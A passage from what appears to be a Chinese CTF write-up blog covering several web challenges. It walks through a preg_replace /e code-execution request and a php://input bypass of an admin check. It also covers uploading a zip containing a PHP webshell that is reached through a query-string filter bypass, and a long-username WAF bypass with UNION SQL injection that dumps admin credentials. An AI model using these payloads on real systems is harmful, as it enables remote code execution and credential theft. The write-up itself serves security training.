+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?pat=/(.*)/e&amp;rep=system(&apos;cat+s3chahahaDir/flag/flag.php&apos;)&amp;sub=aa HTTP/1.1</div><div class="line">Host: 47.104.74.209:20005</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;SecuriTY_Preg_eee3&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="工控云管理系统客服中心期待您的反馈"><a href="#工控云管理系统客服中心期待您的反馈" class="headerlink" title="工控云管理系统客服中心期待您的反馈"></a>工控云管理系统客服中心期待您的反馈</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">工控云管理系统客服中心存在漏洞，flag就在flag/flag/flag/flag/flag/flag/flag.php文件里面</div><div class="line">http://47.104.188.226:20001</div><div class="line"></div><div class="line">请找到这个隐藏的文件，swp？不不不。。。再找找。。</div></pre></td></tr></table></figure>
+<h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><p>有一个上传功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/includes/upload.php</div></pre></td></tr></table></figure></p>
+<p>存在swn,swo,swp文件泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/.index.php.swp</div><div class="line">http://47.104.188.226:20001/.index.php.swo</div><div class="line">http://47.104.188.226:20001/.index.php.swn</div></pre></td></tr></table></figure></p>
+<p>但实际上只有swo，可以直接看到源码：view-source:<a href="http://47.104.188.226:20001/.index.php.swo" target="_blank" rel="external">http://47.104.188.226:20001/.index.php.swo</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span><span class="params">($page)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no flag flag flag flag !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'uploaded'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no uploaded uploaded uploaded uploaded !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'://f'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no ://f ://f ://f'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'ata'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no ata ata ata'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'0'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no 0 0 0'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"./includes/$page.php"</span>)) &#123;</div><div class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page.php"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">elseif</span>(file_exists(<span class="string">"./includes/$page"</span>)) &#123;</div><div class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"File is not exit "</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($adfile, $file)</span></span>&#123;</div><div class="line">  <span class="comment">//Only Administrators can download files .</span></div><div class="line">      $cert = <span class="string">'N'</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($adfile) &amp;&amp; file_get_contents($adfile, <span class="string">'r'</span>) === <span class="string">'Yeah Everything Will Be Ok My Boss'</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"Welcome ! You Are Administrator !"</span>;</div><div class="line">      $cert = <span class="string">'Y'</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"error1"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ($cert === <span class="string">'Y'</span>)&#123;</div><div class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">'error4'</span>);</div><div class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) &gt;= <span class="number">0</span>) &#123;</div><div class="line">      header(<span class="string">'Content-Description: File Transfer'</span>);</div><div class="line">      header(<span class="string">'Content-Type: application/octet-stream'</span>);</div><div class="line">      header(<span class="string">'Content-Disposition: attachment; filename='</span>. basename($file));</div><div class="line">      header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</div><div class="line">      header(<span class="string">'Expires: 0'</span>);</div><div class="line">      header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</div><div class="line">      header(<span class="string">'Pragma: public'</span>);</div><div class="line">      header(<span class="string">'Content-Length: '</span> . filesize($file));</div><div class="line">      readfile($file);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'error2'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">'error3'</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">    $page = <span class="string">'index'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    $page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (stripos($page, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'no ./ ./ ./ ./'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (stripos($page, <span class="string">'://'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'no :// :// ://'</span>);</div><div class="line">&#125;</div><div class="line">autoload($page);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[admin]) &amp;&amp; <span class="keyword">isset</span>($_GET[file])) &#123;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (stripos($_GET[admin], <span class="string">'flag'</span>) &gt; <span class="number">0</span> || stripos($_GET[file], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'not flag flag flag falg !'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (strlen($_GET[file]) &gt;= <span class="number">38</span>) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'too long'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  download($_GET[admin], $_GET[file]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>上面这个是index.php的源码，分析起来两个功能：</p>
+<ol>
+<li>autoload功能，这里提供了一个文件包含，但需要绕过许多限制，后面再说。</li>
+<li>download功能，提供了文件下载功能。</li>
+</ol>
+<p>先利用download功能。在最下面，接受了两个参数<code>admin</code>和<code>file</code>。在download函数中，对<code>admin</code>参数做了检测:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(isset($adfile) &amp;&amp; file_get_contents($adfile, &apos;r&apos;) === &apos;Yeah Everything Will Be Ok My Boss&apos;)</div></pre></td></tr></table></figure></p>
+<p>结合题目里有上传功能，我们访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/index.php?admin=php://input&amp;file=includes/upload.php</div><div class="line"></div><div class="line">POST:</div><div class="line">Yeah Everything Will Be Ok My Boss</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/5.jpg?raw=true" alt=""></p>
+<p>从而获得了upload.php的源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">    <span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no flag flag flag flag !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES)) &#123;</div><div class="line"></div><div class="line">    <span class="comment">//properties of the uploaded file</span></div><div class="line">    $name= $_FILES[<span class="string">"filename"</span>][<span class="string">"name"</span>];</div><div class="line">    $type= $_FILES[<span class="string">"filename"</span>][<span class="string">"type"</span>];</div><div class="line">    $size= $_FILES[<span class="string">"filename"</span>][<span class="string">"size"</span>];</div><div class="line">    $temp= $_FILES[<span class="string">"filename"</span>][<span class="string">"tmp_name"</span>];</div><div class="line">    $error= $_FILES[<span class="string">"filename"</span>][<span class="string">"error"</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($name) &gt;= <span class="number">6</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'name is too long !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($name, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'invalid parameter'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($name, <span class="string">'php'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'invalid parameter'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'zip'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'jpg'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'png'</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'file can not upload ! '</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($error &gt; <span class="number">0</span>)</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Error uploading file! code $error."</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">       &#123;</div><div class="line">        <span class="keyword">if</span>($type !== <span class="string">"application/zip"</span> || $size &gt; <span class="number">400</span>)<span class="comment">//condition for the file</span></div><div class="line">        &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Format not allowed or file size too big!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span>(file_exists(<span class="string">'includes'</span>))&#123;</div><div class="line">            move_uploaded_file($temp, <span class="string">"includes/uploaded/"</span> .$name);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Upload complete a!"</span>;</div><div class="line">            shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">          &#125;<span class="keyword">elseif</span>(file_exists(<span class="string">'uploaded'</span>))&#123;</div><div class="line">            move_uploaded_file($temp, <span class="string">"uploaded/"</span> .$name);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Upload complete!"</span>;</div><div class="line">            shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">          &#125;</div><div class="line">         &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'step'</span>]) &amp;&amp; strlen($_GET[<span class="string">'step'</span>]) === <span class="number">20</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'lag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">' '</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> (stripos($_GET[<span class="string">'step'</span>], <span class="string">'/'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">if</span> (preg_match(<span class="string">'/[^\w\d_ -]/si'</span>, $_GET[<span class="string">'step'</span>])) &#123;</div><div class="line">        $_GET[<span class="string">'step'</span>] = preg_replace(<span class="string">'/[^a-zA-Z0-9_ -]/s'</span>, <span class="string">''</span>, $_GET[<span class="string">'step'</span>]);</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</div><div class="line">      &#125;</div><div class="line">        passthru(<span class="string">'cat '</span> . <span class="string">'uploaded/'</span> . $_GET[<span class="string">'step'</span>]);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>接下来审计upload.php，可以看到允许上传zip文件，里面有这么一段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(file_exists(<span class="string">'includes'</span>))&#123;</div><div class="line">  move_uploaded_file($temp, <span class="string">"includes/uploaded/"</span> .$name);</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Upload complete a!"</span>;</div><div class="line">  shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">&#125;<span class="keyword">elseif</span>(file_exists(<span class="string">'uploaded'</span>))&#123;</div><div class="line">  move_uploaded_file($temp, <span class="string">"uploaded/"</span> .$name);</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Upload complete!"</span>;</div><div class="line">  shell_exec(<span class="string">'sh /var/www/html/includes/unzip.sh'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>调用了unzip.sh，访问<a href="http://47.104.188.226:20001/includes/unzip.sh" target="_blank" rel="external">http://47.104.188.226:20001/includes/unzip.sh</a> ,得到代码：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#/bin/bash</span></div><div class="line"><span class="built_in">cd</span> ./uploaded</div><div class="line">find ./ -size +1M | xargs rm</div><div class="line"><span class="built_in">cd</span> ../</div><div class="line">unzip -o ./uploaded/*.zip <span class="_">-d</span> ./uploaded/</div><div class="line">rm -rf ./uploaded/*.zip</div><div class="line">rm -rf ./uploaded/*.*</div><div class="line">rm -rf ./uploaded/.*</div><div class="line"><span class="built_in">cd</span> ./uploaded</div><div class="line">find -type d | xargs rm -rf</div><div class="line">touch /var/www/html/includes/uploaded/index.php</div><div class="line">chmod 000 /var/www/html/includes/uploaded/index.php</div></pre></td></tr></table></figure></p>
+<p>sh脚本会将zip包解压缩到当前目录的uploaded目录下，接着删除符合规则的三种文件和目录。最后创建index.php，并设置权限位。</p>
+<p>综上，我们构造一个压缩包，使之解压后不被删除，同时结合index.php的page参数的文件包含功能，即可获得shell。</p>
+<p>文件chybeta内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">system(&apos;cat flag/flag/flag/flag/flag/flag/flag.php&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>压缩后为c.zip，在上传时抓包，将type改为application/zip。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/6.jpg?raw=true" alt=""></p>
+<p>上传成功后，会执行unzip.sh，即可解压出压缩包的内容，比如访问<a href="http://47.104.188.226:20001/includes/uploaded/chybeta" target="_blank" rel="external">http://47.104.188.226:20001/includes/uploaded/chybeta</a></p>
+<p>接着考虑如何包含uploaded目录下的chybeta文件。在index.php中，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if (stripos($_SERVER[&apos;QUERY_STRING&apos;], &apos;uploaded&apos;) &gt; 0) &#123;</div><div class="line">  die(&apos;no uploaded uploaded uploaded uploaded !&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>由于这里是用<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，并且用stripos来定位，所以当我们访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/chybeta</div></pre></td></tr></table></figure></p>
+<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>即为<code>uploaded&amp;page=uploaded/chybeta</code>，strpos的值为0，从而绕过了检测。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/7.jpg?raw=true" alt=""></p>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;CVE_SomeThing_aBout_gitLab&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="YUNWAF的突破-青云"><a href="#YUNWAF的突破-青云" class="headerlink" title="YUNWAF的突破_青云"></a>YUN<em>WAF</em>的突破_青云</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><p>当用户名过长时，即可绕过waf，这里a的个数为886个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&apos;+UNION+ALL+SELECT+32,32,CONCAT((SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)),32#</div><div class="line"></div><div class="line">result:</div><div class="line">information_schema cetCCHqy004 mysql performance_schema</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/8.jpg?raw=true" alt=""></p>
+<p>最后payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&apos;+UNION+ALL+SELECT+32,32,CONCAT((SELECT+GROUP_CONCAT(username,password,question,answer+SEPARATOR+0x3c62723e)+FROM+cetCCHqy004.admin)),32#</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/10.jpg?raw=true" alt=""></p>
+<h1 id="请关注工控云管理系统的警告记录"><a href="#请关注工控云管理系统的警告记录" class="headerlink" title="请关注工控云管理系统的警告记录"></a>请关注工控云管理系统的警告记录</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">参与工控云管理系统警告记录的活动，可能奖励你一个flag</div><div class="line">http://47.104.166.183:20008</div></pre></td></tr></table></figure>
